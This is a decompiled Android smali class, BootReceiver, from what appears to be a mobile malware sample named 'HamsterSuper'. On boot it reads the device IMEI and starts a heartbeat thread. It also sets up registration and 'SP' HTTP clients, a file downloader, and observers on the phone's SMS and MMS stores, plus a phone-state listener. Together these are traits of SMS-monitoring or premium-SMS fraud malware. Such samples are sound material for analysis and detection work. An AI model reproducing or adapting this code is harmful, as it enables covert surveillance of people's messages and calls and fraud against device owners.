.class public LHamsterSuper/Client/Deamon/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"


# static fields
.field public static downer:LDaemon/DownLoad/FileDownloader;

.field public static heart:LDaemon/Service/OnlineThread;

.field public static hearthttp:LDaemon/Global/HeartHttp;

.field public static hearttime:J

.field public static http:LDaemon/Service/RerviceHttp;

.field public static mCtx:Landroid/content/Context;

.field public static mode:I

.field public static mostsphttp:LDaemon/Global/MostSpHttp;

.field public static online:LDaemon/Service/OnlineThread;

.field public static receipt:LDaemon/Global/Receipt;

.field public static reghttp:LDaemon/Global/RegHttp;

.field public static smsobserver:LDaemon/Service/SMSObserver;

.field public static sphttp:LDaemon/Global/SpHttp;

.field public static startdate:I


# instance fields
.field mPhoneStateListener:LDaemon/Service/MyPhoneStateListener;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    const/4 v0, 0x0

    .line 26
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 27
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    .line 29
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->http:LDaemon/Service/RerviceHttp;

    .line 30
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    .line 31
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->sphttp:LDaemon/Global/SpHttp;

    .line 32
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->receipt:LDaemon/Global/Receipt;

    .line 33
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    .line 34
    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    .line 39
    const-wide/32 v0, 0xea60

    sput-wide v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    .line 40
    sput v2, LHamsterSuper/Client/Deamon/BootReceiver;->mode:I

    .line 44
    sput v2, LHamsterSuper/Client/Deamon/BootReceiver;->startdate:I

    .line 22
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static me37f0136()V
    .locals 3

    .prologue
    .line 52
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    if-nez v0, :cond_0

    .line 53
    new-instance v0, LDaemon/Service/SMSObserver;

    const/4 v1, 0x0

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v0, v1, v2}, LDaemon/Service/SMSObserver;-><init>(Landroid/os/Handler;Landroid/content/Context;)V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->smsobserver:LDaemon/Service/SMSObserver;

    .line 54
    :cond_0
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->http:LDaemon/Service/RerviceHttp;

    if-nez v0, :cond_1

    .line 55
    new-instance v0, LDaemon/Service/RerviceHttp;

    invoke-direct {v0}, LDaemon/Service/RerviceHttp;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->http:LDaemon/Service/RerviceHttp;

    .line 56
    :cond_1
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    if-nez v0, :cond_2

    .line 57
    new-instance v0, LDaemon/Global/RegHttp;

    invoke-direct {v0}, LDaemon/Global/RegHttp;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    .line 58
    :cond_2
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    if-nez v0, :cond_3

    .line 59
    new-instance v0, LDaemon/Global/HeartHttp;

    invoke-direct {v0}, LDaemon/Global/HeartHttp;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    .line 60
    :cond_3
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->sphttp:LDaemon/Global/SpHttp;

    if-nez v0, :cond_4

    .line 61
    new-instance v0, LDaemon/Global/SpHttp;

    invoke-direct {v0}, LDaemon/Global/SpHttp;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->sphttp:LDaemon/Global/SpHttp;

    .line 62
    :cond_4
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->receipt:LDaemon/Global/Receipt;

    if-nez v0, :cond_5

    .line 63
    new-instance v0, LDaemon/Global/Receipt;

    invoke-direct {v0}, LDaemon/Global/Receipt;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->receipt:LDaemon/Global/Receipt;

    .line 64
    :cond_5
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    if-nez v0, :cond_6

    .line 65
    new-instance v0, LDaemon/Global/MostSpHttp;

    invoke-direct {v0}, LDaemon/Global/MostSpHttp;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    .line 66
    :cond_6
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    if-nez v0, :cond_7

    .line 67
    new-instance v0, LDaemon/DownLoad/FileDownloader;

    sget-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v0, v1}, LDaemon/DownLoad/FileDownloader;-><init>(Landroid/content/Context;)V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    .line 70
    :cond_7
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    if-nez v0, :cond_8

    .line 72
    new-instance v0, LDaemon/Service/OnlineThread;

    invoke-direct {v0}, LDaemon/Service/OnlineThread;-><init>()V

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    .line 73
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->heart:LDaemon/Service/OnlineThread;

    invoke-virtual {v0}, LDaemon/Service/OnlineThread;->start()V

    .line 75
    :cond_8
    return-void
.end method

.method private mcf644442()V
    .locals 2

    .prologue
    .line 47
    const-string v0, "BootReceiver"

    const-string v1, "initListeners"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 48
    new-instance v0, LDaemon/Service/MyPhoneStateListener;

    sget-object v1, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    invoke-direct {v0, v1}, LDaemon/Service/MyPhoneStateListener;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, LHamsterSuper/Client/Deamon/BootReceiver;->mPhoneStateListener:LDaemon/Service/MyPhoneStateListener;

    .line 49
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "ctx"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v9, 0x1

    .line 82
    sput-object p1, LHamsterSuper/Client/Deamon/BootReceiver;->mCtx:Landroid/content/Context;

    .line 83
    const-string v6, "phone"

    invoke-virtual {p1, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/telephony/TelephonyManager;

    .line 84
    .local v5, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    .line 87
    .local v2, "imei":Ljava/lang/String;
    invoke-static {}, LDaemon/Service/OnlineThread;->m5c911dea()I

    move-result v6

    sget v7, LHamsterSuper/Client/Deamon/BootReceiver;->startdate:I

    if-le v6, v7, :cond_0

    if-eqz v2, :cond_0

    .line 90
    invoke-static {}, LHamsterSuper/Client/Deamon/BootReceiver;->me37f0136()V

    .line 91
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    .line 92
    .local v0, "action":Ljava/lang/String;
    const-string v6, "BootReceiver"

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "start:"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 143
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    .line 144
    .local v1, "contentResolver":Landroid/content/ContentResolver;
    new-instance v3, LDaemon/Service/SMSObserver;

    const/4 v6, 0x0

    invoke-direct {v3, v6, p1}, LDaemon/Service/SMSObserver;-><init>(Landroid/os/Handler;Landroid/content/Context;)V

    .line 145
    .local v3, "m_SMSObserver":Landroid/database/ContentObserver;
    const-string v6, "content://sms/"

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-virtual {v1, v6, v9, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 146
    const-string v6, "content://mms/"

    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-virtual {v1, v6, v9, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 147
    new-instance v4, Landroid/content/Intent;

    const-class v6, LDaemon/Service/SMSObserver;

    invoke-direct {v4, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 148
    .local v4, "s":Landroid/content/Intent;
    invoke-virtual {p1, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 151
    invoke-direct {p0}, LHamsterSuper/Client/Deamon/BootReceiver;->mcf644442()V

    .line 156
    .end local v0    # "action":Ljava/lang/String;
    .end local v1    # "contentResolver":Landroid/content/ContentResolver;
    .end local v3    # "m_SMSObserver":Landroid/database/ContentObserver;
    .end local v4    # "s":Landroid/content/Intent;
    :cond_0
    return-void
.end method
